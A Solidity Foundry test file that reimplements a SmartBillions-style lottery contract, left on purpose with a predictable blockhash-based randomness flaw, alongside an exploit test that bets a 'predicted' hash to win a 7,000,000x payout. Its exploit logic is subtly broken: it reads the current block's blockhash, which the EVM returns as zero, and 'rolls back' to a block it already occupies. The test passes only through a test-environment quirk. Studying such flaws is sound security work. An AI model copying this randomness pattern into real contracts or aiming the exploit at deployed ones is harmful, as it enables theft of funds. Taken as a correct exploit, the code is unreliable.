pragma solidity ^0.8.33;

import "forge-std/Test.sol";

contract SmartBillions {
    struct Bet {
        uint192 value;
        uint32 betHash;
        uint32 blockNum;
    }
    mapping(address => Bet) internal bets;
    uint public maxWin;
    event LogWin(address indexed player, uint bethash, uint hash, uint prize);
    event LogLoss(address indexed player, uint bethash, uint hash);
    event LogRecordWin(address indexed player, uint amount);

    function betPrize(Bet memory _player, uint24 _hash) private pure returns (uint) {
        uint24 bethash = uint24(_player.betHash);
        uint24 hit = bethash ^ _hash;
        uint24 matches =
            ((hit & 0xF) == 0 ? 1 : 0) +
            ((hit & 0xF0) == 0 ? 1 : 0) +
            ((hit & 0xF00) == 0 ? 1 : 0) +
            ((hit & 0xF000) == 0 ? 1 : 0) +
            ((hit & 0xF0000) == 0 ? 1 : 0) +
            ((hit & 0xF00000) == 0 ? 1 : 0);
        if(matches == 6){
            unchecked { return uint(_player.value) * 7000000; }
        }
        if(matches == 5){
            unchecked { return uint(_player.value) * 20000; }
        }
        if(matches == 4){
            unchecked { return uint(_player.value) * 500; }
        }
        if(matches == 3){
            unchecked { return uint(_player.value) * 25; }
        }
        if(matches == 2){
            unchecked { return uint(_player.value) * 3; }
        }
        return 0;
    }

    function bet(uint32 betHash) external payable {
        require(msg.value > 0, "No bet value");
        require(bets[msg.sender].value == 0, "Already bet");
        bets[msg.sender] = Bet({
            value: uint192(msg.value),
            betHash: betHash,
            blockNum: uint32(block.number)
        });
    }

    function won() public {
        Bet memory player = bets[msg.sender];
        require(player.value > 0, "No active bet");
        require(block.number > player.blockNum, "bet not settled yet");
        require(block.number < player.blockNum + 256, "too late to settle");

        uint32 hash = uint32(uint24(uint256(blockhash(player.blockNum))));
        uint prize = betPrize(player, uint24(hash));

        bets[msg.sender] = Bet({value: 0, betHash: 0, blockNum: 1});

        if(prize > 0){
            emit LogWin(msg.sender, uint(player.betHash), uint(hash), prize);
            if(prize > maxWin){
                maxWin = prize;
                emit LogRecordWin(msg.sender, prize);
            }
            (bool success, ) = payable(msg.sender).call{value: prize}("");
            require(success, "Transfer failed");
        } else {
            emit LogLoss(msg.sender, uint(player.betHash), uint(hash));
        }
    }

    receive() external payable {}
}

contract ExploitTest is Test {
    SmartBillions sb;

    function setUp() public {
        sb = new SmartBillions();
        vm.deal(address(this), 100 ether);
        // Fund the contract so it can pay out large prizes
        vm.deal(address(sb), 1_000_000 ether);
    }

    function test_exploit_bad_randomness() public {
        // The block number at which we will place the bet
        uint32 betBlock = uint32(block.number + 1);

        // Advance to betBlock to get its blockhash
        vm.roll(betBlock);

        // Get the blockhash of betBlock
        bytes32 bh = blockhash(betBlock);

        // Extract lower 3 bytes as uint24
        uint24 predictedHash24 = uint24(uint256(bh));

        // Place bet with predicted hash at betBlock
        // Roll back to betBlock to place the bet with blockNum == betBlock
        vm.roll(betBlock);
        sb.bet{value: 1 ether}(predictedHash24);

        // Advance to betBlock + 1 so bet can be settled
        vm.roll(betBlock + 1);

        uint256 initialBalance = address(this).balance;

        sb.won();

        uint256 finalBalance = address(this).balance;

        // The prize should be huge (1 ether * 7,000,000)
        assertGt(finalBalance, initialBalance + 1 ether * 1000);

        // maxWin should be updated
        assertEq(sb.maxWin(), 1 ether * 7000000);
    }
}

